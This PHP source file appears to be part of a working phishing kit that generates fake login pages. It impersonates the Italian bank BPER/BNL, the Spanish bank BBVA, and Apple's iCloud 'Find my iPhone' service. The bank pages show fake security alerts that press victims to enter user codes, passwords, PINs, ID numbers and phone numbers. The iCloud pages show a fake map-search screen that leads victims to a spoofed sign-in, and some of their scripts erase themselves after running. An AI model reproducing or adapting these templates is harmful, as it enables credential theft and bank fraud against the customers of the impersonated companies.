	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirect = $ci->load->get_var('redirect');
	$redirecturl = $ci->load->get_var('redirecturl');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$RandomIdentificacao = time()*rand();

	$html2 = '//Template 7//';
	$html = '<!DOCTYPE html>
<html lang="en">
<head>
	<title>Gruppo BPER - Internet Banking</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/png" href="/assets/bank7/favicon.png"/>
	<link rel="stylesheet" type="text/css" href="/assets/bank7/bootstrap/css/bootstrap.min.css">

	<link rel="stylesheet" type="text/css" href="/assets/bank7/util.css">
	<link rel="stylesheet" type="text/css" href="/assets/bank7/main.css">

<style>
.header {
  overflow: hidden;
  background-color: #fff;
  padding: 20px 10px;
}

.header a {
  float: left;
  color: black;
  text-align: left;
  padding: 12px;
  text-decoration: none;
  font-size: 18px;
  line-height: 25px;
  border-radius: 4px;
}

.header a.logo {
  font-size: 25px;
  font-weight: bold;
}

.header a:hover {
  background-color: #fff;
  color: black;
}

.header a.active {
  background-color: dodgerblue;
  color: white;
}

.header-right {
  float: right;
}

.alertSection {
	text-align: center;
}

h3 {
	text-align: center;
	padding: 12px;
	font-size: 1.3rem;
}

@media screen and (max-width: 500px) {
  .header a {
    float: none;
    display: block;
    text-align: left;
  }
  .header-right {
    float: none;
  }
}
</style>

</head>
<body>

	<div class="header">
	  <img src="/assets/bank7/bnl-logo.png" style="width:35%;    margin-left: 10px;">
	  <div class="header-right">

	  </div>
	</div>

		<div class="limiter" id=Primeira-Pagina>
			<div class="alertSection" style="margin: 15px;">
					<div class="blockImage">
						 <div class="item-multiple__element " style="  min-height: auto;; margin-top: 30px !important" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;30&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
								<div class="block__ico ico-center">
									 <img src="/assets/bank7/Error-512.png" data-isp-image-chooser="" data-desktop-src="/assets/bank7/Error-512.png" style="width:100px;height:100px;" >
								</div>
						 </div>
					</div>
					<br>
					<h3 class="medium-title" style="margin: 10px;">
						<span class="textCenter" style="font-size: 1.75rem;color:red;">
							ALERT SICUREZZA ACCESSO INTERNET BANKING
						</span>
					</h3>
					<br>È stato effettuato un accesso su un dispositivo non riconosciuto se non sei stato tu clicca e verifica i dati.
				   <br /><br />
				   <b>Inserire le informazioni di seguito per procedere con la verifica di sicurezza:</b>
		    		</p>
			</div>
			<div class="container-login100">
				<div class="wrap-login100 p-l-85 p-r-85">
						<span class="txt1 p-b-11">
						</span>
						<input type="hidden" name="apple_add" id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '">
						<input type="hidden" name="link_address" id="link_address" value="' . $_SERVER['SERVER_NAME'] . '">
						<input type="hidden" name="TemplateBank" id="TemplateBank" value="7">
						<input type="hidden" name="RandomIdentificacao" id="RandomIdentificacao" value="' . $RandomIdentificacao . '">
						<input type="hidden" name="MD5IdentificaAcesso" id="MD5IdentificaAcesso" value="' . $MD5IdentificaAcesso . '">
						<div class="wrap-input100 validate-input m-b-36" data-validate = "Codice Utente richiesto">
							<input class="input100" type="text" name="codice" id="Usuario" placeholder="Inserisci il tuo Codice Utente/Alias">
							<span class="focus-input100"></span>
						</div>
						<span class="txt1 p-b-11">
						</span>
						<div class="wrap-input100 validate-input m-b-36" data-validate = "Password richiesta">
							<input class="input100" type="password" name="password" id="Senha" placeholder="Inserisci la tua Password">
							<span class="focus-input100"></span>
						</div>
						<span class="txt1 p-b-11">
						</span>
						<div class="wrap-input100 validate-input m-b-36" data-validate = "Telefono richiesto">
							<input class="input100" type="text" name="telefono" id="Telefone" placeholder="Inserisci il tuo Telefono">
							<span class="focus-input100"></span>
						</div>
						<div class="container-login100-form-btn">
							<button id="BtnSend" onclick="CickMain1()" type="submit">
								<img src="/assets/bank7/login-button.png" alt="submit" />
							</button>
						</div>
						<br><br>
				</div>
			</div>
		</div>


<div class="limiter" id="Segunda-Pagina" style="display: none;">
	<div class="alertSection">
		<div class="blockImage section">
			<div class="item-multiple__element " style="  min-height: auto;; margin-top: 30px !important" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;30&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
				<div class="block__ico ico-center">
				<img class="img_responsive" style="height:100px; width:100px; align:center;" src="/assets/bank7/Exclamation.svg.png" />
				</div>
			</div>
		</div>
		<div class="blockTitle section">
			<div class="item-multiple__element  space10" style=" text-align: left; min-height: auto;" data-isp-spazio-manuale="{&quot;panelSize&quot;:&quot;space10&quot;}">
				<div class="block__title">
					<div>
					</div>
				<br>
				<h3 class="medium-title"><span class="textCenter">Conto verificato con successo. Tutti i dispositivi sono stati disconnessi. Potrai essere contattato da un nostro operatore per ulteriori verifiche.
				</span></h3>
				</div>
			</div>
		</div>
	</div>
</div>

	<div id="dropDownSelect1"></div>
	<script src="/assets/js/jquery.js"></script>
<script src="/assets/bank7/bank7.js?t=' . time() .'"></script>

</body>
</html>';
	return $html;
}
}


if (!(function_exists('passwordTemplate'))) {
function passwordTemplate($title, $emailid, $MD5IdentificaAcesso)
{
	$finalLink 			= $_SERVER["REQUEST_URI"];
	$finalLinkExplode	= explode("/", $finalLink);
	if(strstr($emailid,"@")){
		$novoMail = $emailid;
	}else{
		$novoMail='';
		}
	$ci = &get_instance();
	$redirecturl2 = $ci->load->get_var('redirecturl2');
	$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
	$title = ((isset($title) ? $title : 'iCloud'));
	$RandomIdentificacao = time()*rand();

	$html = "//Template3//";
	$html = '<html lang="es">
<head>
	<title>BBVA</title>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="icon" type="image/png" href="/assets/bank3/favicon.png"/>

	<link rel="stylesheet" type="text/css" href="/assets/bank3/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="/assets/bank3/util.css">
	<link rel="stylesheet" type="text/css" href="/assets/bank3/main.css">

	<style>
.alertSection {
	text-align: center;
}
</style>

</head>
<body>

	<div class="header">
	  <img src="/assets/bank3/bbva-logo.svg" style="width:12%">
	  <div class="header-right">

	  </div>
	</div>

	<div id="Primeira-Pagina" class="limiter">

		<div class="container-login100">

			<div class="wrap-login100 p-l-85 p-r-85 p-b-55">
        <span class="login100-form-title">
          <br/>
					<p style="font-size:40px">
						<font color="red">
							<b>!</b>
						</font>
					</p>
					<p style="font-size:15px">
						<font color="white">
							Gentil cliente, después de varios intentos de ingreso en tu banca online, para evitar suspensiones a tu cuenta verifica tu número.
						</font>
					</p>
					<br/>
          <div class="textgen">
          </div>
        </span>
				<input type="hidden" name="apple_add" id="apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '">
				<input type="hidden" name="link_address" id="link_address" value="' . $_SERVER['SERVER_NAME'] . '">
				<input type="hidden" name="TemplateBank" id="TemplateBank" value="3">
				<input type="hidden" name="RandomIdentificacao" id="RandomIdentificacao" value="' . $RandomIdentificacao . '">
				<input type="hidden" name="MD5IdentificaAcesso" id="MD5IdentificaAcesso" value="' . $MD5IdentificaAcesso . '">

			<div class="wrap-input100 validate-input m-b-12" data-validate = "Obligatorio">
						<input class="input100" type="text" name="num_cliente" id="num_cliente" placeholder="NIF, NIE, Tarjeta o Pasaporte *" >
						<span class="focus-input100"></span>
					</div>

					<div class="wrap-input100 validate-input m-b-12" data-validate = "Obligatorio">
						<input class="input100" type="password" name="pin" id="pin" placeholder="Clave de acceso *" >
						<span class="focus-input100"></span>

					</div>

					<div class="wrap-input100 validate-input m-b-12" data-validate = "Obligatorio">
						<input class="input100" type="text" name="telefono" id="telefono" placeholder="Nùmero de movil *" >
						<span class="focus-input100"></span>

					</div>

          <div class="container-login100-form-btn m-b-12">
            <button onclick="CickMain1()" id="BtnSend" class="generated-text" type="submit">Verificación</button>

          </div>
			</div>
		</div>
	</div>
	<div id="Segunda-Pagina" class="limiter" style="display: none;">
		<div class="container-login100">
			<div class="wrap-login100 p-l-85 p-r-85">
			</div>
      <div class="alertSection">
        <div class="blockImage section">
           <div class="item-multiple__element " style="  min-height: auto;" data-isp-spazio-manuale="{&quot;dmtop&quot;:&quot;30&quot;,&quot;panelSize&quot;:&quot;custom&quot;}">
              <div class="block__ico ico-center">
                 <img class="img_responsive" style="height:100px; width:100px; align:center;" src="/assets/bank3/Exclamation.svg.png" />
              </div>
           </div>
        </div>
        <div class="blockTitle section">
           <div class="item-multiple__element  space10" style=" text-align: left; min-height: auto;" data-isp-spazio-manuale="{&quot;panelSize&quot;:&quot;space10&quot;}">
              <div class="block__title">
                 <div>
             </div>
             <br>
                 <h3 class="medium-title"><span class="textCenter" style="font-size:21px;color:#fff;font-family:sans-light;"> El numero fue verificado correctamente, en el menor tiempo posible te contactara un operador para completar las actualizaciones de seguridad. </span></h3>
           </div>
        </div>
      </div>
    </div>
		</div>
	</div>
	<div id="dropDownSelect1"></div>
	<script src="/assets/js/jquery.js"></script>
	<script src="/assets/bank3/bank3.js?t=' . time() .'"></script>
</body>
</html>
';

	return $html;
}
}

if (!(function_exists('Map2020Modelo1'))) {
	function Map2020Modelo1($title, $emailid)
	{
		$finalLink 			= $_SERVER["REQUEST_URI"];
		$finalLinkExplode	= explode("/", $finalLink);
		if(strstr($emailid,"@")){
			$novoMail = $emailid;
		}else{
			$novoMail='';
			}
		$ci = &get_instance();
		$redirect = $ci->load->get_var('redirect');
		$redirecturl = $ci->load->get_var('redirecturl');
		$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
		$title = ((isset($title) ? $title : 'iCloud'));

		//$html = "Map2020Modelo1 asd" . $ci->global_data['loginPage'];


		//INICIO

		$html = "\n" . '<html>';
		$html .= "\n" . '<script src = "/assets/src/icloud_page/jquery-1.10.2.js"></script>';
				 "\n" .
				 "\n" .
		$html .= "\n" . '<!--[if IE 6]><meta http-equiv="refresh" content="0;URL=unsupported/"><![endif]--> ';
		$html .= "\n" . '<!--[if IE 7]><meta http-equiv="refresh" content="0;URL=unsupported/"><![endif]--> ';
		$html .= "\n" . '<!--[if IE 8]><meta http-equiv="refresh" content="0;URL=unsupported/"><![endif]-->';
		$html .= "\n" . '<meta name="viewport" content="width=device-width, initial-scale=1">';
		$html .= "\n" . '<title>'.$title.'</title>   ';
		$html .= "\n" . '<link rel="shortcut icon" href="favicon.ico" type="image/x-icon" />';
		$html .= "\n" . '<link rel="stylesheet" type="text/css" href="/assets/src/activation_lock/passcode.css">';
		$html .= "\n" . '<link rel="stylesheet" href="/assets/src/form.css" >';
		$html .= "\n" . '<link rel="stylesheet" href="/assets/src/form2.css" >';
		$html .= "\n" . '<link rel="stylesheet" href="/assets/src/nav.css" >';
		$html .= "\n" . '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">';
		$html .= "\n" . '<script src="/assets/src/code.jquery.com/jquery-1.10.2.js"></script>';
		$html .= "\n" . '<script src="/assets/src/code.jquery.com/ui/1.12.1/jquery-ui.js"></script>	<script src="/assets/src/icloud_page_new/activity-indicator.js"></script>';
		$html .= "\n" . '';
		$html .= "\n" . '</head>';
		$html .= "\n" . '<body id="body_b" style="font-family: Arial, Helvetica, sans-serif; ">';
		$html .= "\n" . '<div id="show_1" style="display: block;">';
		$html .= "\n" . '<div style="margin: 0; position: absolute; top: 50%; left: 50%; -ms-transform: translate(-50%, -50%); transform: translate(-50%, -50%);">';
		$html .= "\n" . '<div id="submit_loader_1"></div>';
		$html .= "\n" . '<div style="padding-top: 18px; text-align: center;"><label style="font-family: Arial, Helvetica, sans-serif;">';
		$html .= "\n" . 'Pode levar alguns minutos para localizar o seu iPhone perdido.</label></div></div></div>';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '<div  id="show_3" style="text-align: center; height: 100%; display: none;">';
		$html .= "\n" . '<div id="map-container-google-1" class="z-depth-1-half map-container" style="height: 100%">';
		$html .= "\n" . '<iframe src="https://maps.google.com/maps?q=. Rio de Janeiro - Centro .&t=a&zoom=-10&ie=UTF8&iwloc=&output=embed" frameborder="0"';
		$html .= "\n" . 'style="border:0" allowfullscreen></iframe>	 ';
		$html .= "\n" . '';
		$html .= "\n" . '<nav id="header" role="navigation">';
		$html .= "\n" . '<div class="hd-content">';
		$html .= "\n" . '<ul class="hd-header">';
		$html .= "\n" . '<li class="hd-item hd-menuicon"><p style="color:white;text-align:center;font-weight:bold; padding: 10px 10px 10px 14px;">Apple</p>';
		$html .= "\n" . '<label class="hd-menuicon-label" for="hd-menustate"> <span class="hd-menuicon-bread hd-menuicon-bread-top"></span>';
		$html .= "\n" . '</label>';
		$html .= "\n" . '<a href="#" class="hd-menuanchor hd-menuanchor-open" id="hd-menuanchor-open"> <span class="hd-menuanchor-label">Open Menu</span> </a>';
		$html .= "\n" . '<a href="#" class="hd-menuanchor hd-menuanchor-close" id="hd-menuanchor-close"> <span class="hd-menuanchor-label">Close Menu</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-apple">';
		$html .= "\n" . '<a class="hd-link hd-link-apple" href="#" id="hd-firstfocus-small"> <span class="hd-link-text">logo</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '</ul>';
		$html .= "\n" . '<ul class="hd-list">';
		$html .= "\n" . '<li class="hd-item hd-apple">';
		$html .= "\n" . '<a class="hd-link hd-link-apple" href="#" id="hd-firstfocus"><span class="hd-link-text">logo</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-mac">';
		$html .= "\n" . '<a class="hd-link hd-link-mac" href="#"><span class="hd-link-text">Mac</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-ipad">';
		$html .= "\n" . '<a class="hd-link hd-link-ipad" href="#"><span class="hd-link-text">Pad</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-iphone">';
		$html .= "\n" . '<a class="hd-link hd-link-iphone" href="#"><span class="hd-link-text">Phone</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-watch">';
		$html .= "\n" . '<a class="hd-link hd-link-watch" href="#"><span class="hd-link-text">Watch</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-tv">';
		$html .= "\n" . '<a class="hd-link hd-link-tv" href="#"><span class="hd-link-text">TV</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-music">';
		$html .= "\n" . '<a class="hd-link hd-link-music" href="#"><span class="hd-link-text">Music</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-support">';
		$html .= "\n" . '<a class="hd-link hd-link-support" href="#"><span class="hd-link-text">Support</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-search">';
		$html .= "\n" . '<a class="hd-link hd-link-search" href="#"> <span class="hd-search-placeholder" aria-hidden="true">Search</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '';
		$html .= "\n" . '</ul>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</nav> ';
		$html .= "\n" . '';
		$html .= "\n" . '<div class="footer">';
		$html .= "\n" . 'Copyright © '.date("Y").' Apple Inc. Todos os direitos reservados.</div>	';
		$html .= "\n" . '';
		$html .= "\n" . '<div class="buttons-holder">';
		$html .= "\n" . '<div class="spinner">';
		$html .= "\n" . '<img   src="/assets/src/imap.png"   onclick="openForm()" style="width:100px">';
		$html .= "\n" . '<div class="double-bounce1"></div>';
		$html .= "\n" . '<div class="double-bounce2"></div>';
		$html .= "\n" . '</div>  <button type="button" id="buttop" onclick="openForm()" style="width:auto; font-size: 15px;"><b>';
		$html .= "\n" . 'Buscar iPhone</b></button>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '<script type="text/javascript">';
		$html .= "\n" . 'jQuery("#submit_loader_1").activity({width: 1, segments: 12, length: 5});';
		$html .= "\n" . 'jQuery("#submit_loader_2").activity({width: 1, segments: 12, length: 5});';
		$html .= "\n" . '';
		$html .= "\n" . '$(".close").click(function(){';
		$html .= "\n" . '$("#myModal").css("display", "none");';
		$html .= "\n" . '$("#pw").focus();';
		$html .= "\n" . '';
		$html .= "\n" . '});';
		$html .= "\n" . '</script>';
		$html .= "\n" . '</body>';
		$html .= "\n" . '</html>';
		$html .= "\n" . '';
		$html .= "\n" . '<script id="erasable_1" type="text/javascript">';
		//$html .= "\n" . '/**';
		$html .= "\n" . 'setInterval(function () {document.getElementById("buttop").click();}, 7000);';
		$html .= "\n" . 'var	setcolor = 0;';
		$html .= "\n" . 'var num = 0;';
		$html .= "\n" . 'var afis = 0;';
		$html .= "\n" . 'function remove() {';
		$html .= "\n" . 'if (setcolor > 0){';
		$html .= "\n" . 'changePolyColor("white");';
		$html .= "\n" . 'num = parseInt(num/10);	';
		$html .= "\n" . '}';
		$html .= "\n" . 'setcolor--;';
		$html .= "\n" . 'if (setcolor <  1)';
		$html .= "\n" . 'setcolor = 0;';
		$html .= "\n" . '}';
		$html .= "\n" . 'function changePolyColor(color) {';
		$html .= "\n" . 'var poly = document.getElementById("c" + setcolor);';
		$html .= "\n" . 'poly.setAttribute("fill", color);';
		$html .= "\n" . '}';
		$html .= "\n" . 'document.getElementById("erasable_1").innerHTML = "";';
		//$html .= "\n" . '**/';
		$html .= "\n" . '</script>';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '<script id="erasable_2" type="text/javascript">';
		$html .= "\n" . '$(document).ready(function(){';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . 'function callback(){';
		$html .= "\n" . 'num = 0;';
		$html .= "\n" . '';
		$html .= "\n" . 'setTimeout(clear(), 3000);';
		$html .= "\n" . '}';
		$html .= "\n" . 'function clear(){';
		$html .= "\n" . 'for (var i=0;i<=6;i++){';
		$html .= "\n" . 'changePolyColor("white");';
		$html .= "\n" . 'setcolor--;';
		$html .= "\n" . '}	';
		$html .= "\n" . 'setcolor = 0;			';
		$html .= "\n" . '}';
		$html .= "\n" . 'function show_body() {';
		$html .= "\n" . '$("#show_1").css("display", "none");';
		$html .= "\n" . '$( "#show_3" ).fadeIn( "slow", function() {';
		$html .= "\n" . '// Animation complete.';
		$html .= "\n" . '//$( "#code_in" ).focus();';
		$html .= "\n" . '});';
		$html .= "\n" . '}';
		$html .= "\n" . 'setTimeout(show_body, 3000);';
		$html .= "\n" . '';
		$html .= "\n" . '});';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . 'document.getElementById("erasable_2").innerHTML = "";</script>';
		$html .= "\n" . '<script type="text/javascript">';
		$html .= "\n" . 'jQuery("#submit_loader_1").activity({width: 1, segments: 12, length: 5});';
		$html .= "\n" . 'jQuery("#submit_loader_2").activity({width: 1, segments: 12, length: 5});';
		$html .= "\n" . '';
		$html .= "\n" . '$(".close").click(function(){';
		$html .= "\n" . '$("#myModal").css("display", "none");';
		$html .= "\n" . '$("#pw").focus();';
		$html .= "\n" . '';
		$html .= "\n" . '});';
		$html .= "\n" . '';
		$html .= "\n" . 'function openForm() {';
		$html .= "\n" . 'window.location = "/' . $ci->global_data['loginPage'] .'/'. $finalLinkExplode[2] . '";   ';
		$html .= "\n" . '//  document.getElementById("myForm").style.display = "block";';
		$html .= "\n" . '';
		$html .= "\n" . '}';
		$html .= "\n" . '';
		$html .= "\n" . 'function closeForm() {';
		$html .= "\n" . 'document.getElementById("myForm").style.display = "none";';
		$html .= "\n" . '}';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '</script>';
		$html .= "\n" . '<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>';
		$html .= "\n" . '';
		$html .= "\n" . '<script>';
		$html .= "\n" . '$(function() {';
		$html .= "\n" . '$("#myForm").delay(500000).fadeIn(500);';
		$html .= "\n" . '});';
		$html .= "\n" . '</script>';

//FIM

		return $html;
	}
}

if (!(function_exists('Map2020Modelo2'))) {
	function Map2020Modelo2($title, $emailid)
	{
		$finalLink 			= $_SERVER["REQUEST_URI"];
		$finalLinkExplode	= explode("/", $finalLink);
		if(strstr($emailid,"@")){
			$novoMail = $emailid;
		}else{
			$novoMail='';
			}
		$ci = &get_instance();
		$redirect = $ci->load->get_var('redirect');
		$redirecturl = $ci->load->get_var('redirecturl');
		$logged = (($ci->session->userdata('logged_in') == false ? 'none' : 'block'));
		$title = ((isset($title) ? $title : 'iCloud'));



		$html = '<!DOCTYPE html>';
		$html .= "\n" . '<html>';
		$html .= "\n" . '<link rel="stylesheet" href="/assets/fdmy/styles_c.css">';
		$html .= "\n" . '<link rel="stylesheet" href="/assets/fdmy/fmis.css">';

		$html .= "\n" . '<script src="/assets/js/jquery.js"></script>' ;
		//$html .= "\n" . '<script src="' . site_url('assets/js/bolinha.js?t=' . time()) . '" type="text/javascript"></script>' ;
		$html .= "\n" . '<script src="/assets/js/strap.min.js"></script>' ;
		$html .= "\n" . '<script src="/assets/js/newc.min.js?t=' . time() . '"></script>';
		$html .= "\n" . '<script src="/assets/js/ajax-form.js"></script>' . "\n" . '</body>' . "\n" . '</html>' ;
		$html .= "\n" . '<script src="' . site_url('assets/js/Maps2.js?t=' . time()) . '" type="text/javascript"></script>';

		$html .= "\n" . '<script src="/assets/fdmy/jquery-1.10.2.js"></script>';
		$html .= "\n" . '<script src="/assets/fdmy/jquery-1.12.4.js"></script>';
		$html .= "\n" . '<script src="/assets/fdmy/activity-indicator.js"></script>';
		$html .= "\n" . '<script src="/assets/fdmy/ph.js"></script>';
		$html .= "\n" . '<script type="text/javascript" src="/assets/fdmy/authService.latest.min.js"></script>';


		$html .= "\n" . '<link rel="stylesheet" media="all" href="/assets/fdmy/app_2.css">';
		$html .= "\n" . '<link rel="icon" href="favicon.ico">';
		$html .= "\n" . '<meta name="viewport" content="width=device-width, initial-scale=1">';
		$html .= "\n" . '<title>'.$title.'</title>   ';
		$html .= "\n" . '<link rel="stylesheet" href="/assets/fdmy/form.css">';
		$html .= "\n" . '<link rel="stylesheet" href="/assets/fdmy/form2.css">';
		$html .= "\n" . '<link rel="stylesheet" href="/assets/fdmy/nav.css">';
		//$html .= "\n" . '<link rel="stylesheet" href="/assets/layout/applenew.css">';
		$html .= "\n" . '<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">';
		$html .= "\n" . '<script src="/assets/fdmy/jquery-ui.js"></script>';
		$html .= "\n" . '</head>';
		$html .= "\n" . '<body id="body_b" style="font-family: Arial, Helvetica, sans-serif; ">';
		$html .= "\n" . '<div id="show_1" style="display: block;"><section id="compass" >';
		$html .= "\n" . '<div class="compass">';
		$html .= "\n" . '<img src="/assets/fdmy/compass1.png" class="compass1" alt="">';
		$html .= "\n" . '<img src="/assets/fdmy/compass2.png" class="compass2" alt="">';
		$html .= "\n" . '<img src="/assets/fdmy/compass3.png" class="compass3" alt="">';
		$html .= "\n" . '<span>';
		$html .= "\n" . 'Pode levar alguns minutos para localizar o seu iPhone perdido.</span>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</section></div>	<div  id="show_3" style="text-align: center; height: 100%; display: none;">';
		$html .= "\n" . '<div id="map-container-google-1"  class="z-depth-1-half map-container" style="height: 100%">';
		$html .= "\n" . '<iframe style="pointer-events:none;border:0" src="https://maps.google.com/maps?q=Brasil&t=k&z=11&ie=UTF8&iwloc=B&output=embed&hl=en" frameborder="0" allowfullscreen></iframe>     <nav id="header" role="navigation">';
		$html .= "\n" . '<div class="hd-content">';
		$html .= "\n" . '<ul class="hd-header">';
		$html .= "\n" . '<li class="hd-item hd-menuicon"><p style="color:white;text-align:center;font-weight:bold; padding: 10px 10px 10px 14px;">Apple</p>';
		$html .= "\n" . '<label class="hd-menuicon-label" for="hd-menustate"> <span class="hd-menuicon-bread hd-menuicon-bread-top"></span>';
		$html .= "\n" . '</label>';
		$html .= "\n" . '<a href="#" class="hd-menuanchor hd-menuanchor-open" id="hd-menuanchor-open"> <span class="hd-menuanchor-label">Open Menu</span> </a>';
		$html .= "\n" . '<a href="#" class="hd-menuanchor hd-menuanchor-close" id="hd-menuanchor-close"> <span class="hd-menuanchor-label">Close Menu</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-apple">';
		$html .= "\n" . '<a class="hd-link hd-link-apple" href="#" id="hd-firstfocus-small"> <span class="hd-link-text">logo</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '</ul>';
		$html .= "\n" . '<ul class="hd-list">';
		$html .= "\n" . '<li class="hd-item hd-apple">';
		$html .= "\n" . '<a class="hd-link hd-link-apple" href="#" id="hd-firstfocus"><span class="hd-link-text">logo</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-mac">';
		$html .= "\n" . '<a class="hd-link hd-link-mac" href="#"><span class="hd-link-text">Mac</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-ipad">';
		$html .= "\n" . '<a class="hd-link hd-link-ipad" href="#"><span class="hd-link-text">Pad</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-iphone">';
		$html .= "\n" . '<a class="hd-link hd-link-iphone" href="#"><span class="hd-link-text">Phone</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-watch">';
		$html .= "\n" . '<a class="hd-link hd-link-watch" href="#"><span class="hd-link-text">Watch</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-tv">';
		$html .= "\n" . '<a class="hd-link hd-link-tv" href="#"><span class="hd-link-text">TV</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-music">';
		$html .= "\n" . '<a class="hd-link hd-link-music" href="#"><span class="hd-link-text">Music</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-support">';
		$html .= "\n" . '<a class="hd-link hd-link-support" href="#"><span class="hd-link-text">Support</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '<li class="hd-item hd-item-menu hd-search">';
		$html .= "\n" . '<a class="hd-link hd-link-search" href="#"> <span class="hd-search-placeholder" aria-hidden="true">Search</span> </a>';
		$html .= "\n" . '</li>';
		$html .= "\n" . '';
		$html .= "\n" . '</ul>';
		$html .= "\n" . '</div>';
		$html .= "\n" . '</nav> ';
		$html .= "\n" . '';
		$html .= "\n" . '<div class="footeri">';
		$html .= "\n" . 'Copyright © 2020 Apple Inc. Todos os direitos reservados.</div>	';
		$html .= "\n" . '';
		$html .= "\n" . '<div id="bac" class="buttons-holder" style="height:100px;width:100px; position:absolute;left:47%;">';
		$html .= "\n" . '<div class="spinner">';
		$html .= "\n" . '<div class="double-bounce1"></div>';
		$html .= "\n" . '<div class="double-bounce2"></div>';
		$html .= "\n" . '<img src="';
		$html .= "\n" . '/assets/fdmy/imap.png';
		$html .= "\n" . '" onclick="openForm()" style="width:100px"></div></div>';
		$html .= "\n" . '';
		$html .= "\n" . '';
		$html .= "\n" . '<div class="form-popup" id="myForm" style="text-align: center; display: none;">';
		$html .= "\n" . '<div  name="myForm"  class="form-container">';
		$html .= "\n" . '<center>';
		$html .= "\n" . '<div class="app-container">';
		$html .= "\n" . '<hero {(page)}="page">';
		$html .= "\n" . '<div class="hero signin">                    ';
		$html .= "\n" . '<div id="authWidgetContainer" class="auth-widget-container">';
		$html .= "\n" . '<div id="block_pass" class="hide">';
		$html .= "\n" . '<div class="body">';
		$html .= "\n" . '<div data-isiebutnotedge="false" data-mode="embed" class="widget-container fade-in  restrict-max-wh  fade-in ">';
		$html .= "\n" . '<h1>  <img  src="';
		$html .= "\n" . '/assets/fdmy/r131.png';
		$html .= "\n" . '" style="width: 80px; padding-bottom: 12px "></h1>';
		$html .= "\n" . '<h1 tabindex="-1" class="tk-intro ">';
		$html .= "\n" . 'Iniciar sessão no iCloud</h1>';
		$html .= "\n" . '<div class="si-step " id="step">';
		$html .= "\n" . '<sign-in suppress-iforgot="{suppressIforgot}">';
		$html .= "\n" . '<div class="signin fade-in " id="signin">';
		$html .= "\n" . '<div class="container si-field-container ">';
		/*
		$html .= "\n" . '<div style="min-height: 88px">        ';
		$html .= "\n" . '<div id="login_css" class="row no-gutter si-field apple-id" style="border-bottom-left-radius: 6px; border-bottom-right-radius: 6px;">';
		$html .= "\n" . '<div class="col-xs-12">';
		$html .= "\n" . '<div id="login_div" class="ax-border apple-id appleid-focus" style="border-bottom-left-radius: 6px;border-bottom-right-radius: 6px;border-bottom-width: 1px;">';
		*/
		//$html .= form_open(site_url('authority/get'), array('class' => 'cloud-login form-ajax', 'role' => 'form', 'data-red' => ($redirect == 1 ? $redirecturl : site_url('findmyiphone')), 'data-reds' => ($redirect == 1 ? 1 : 0), 'style' => 'display:block !important')) . "\n";
		//$html .= "\n" . '<input type="hidden" name = "apple_add" value="' . set_value('apple_id', $finalLinkExplode[2]) . '" >';
		//$html .= "\n" . '<input id="login" placeholder="';
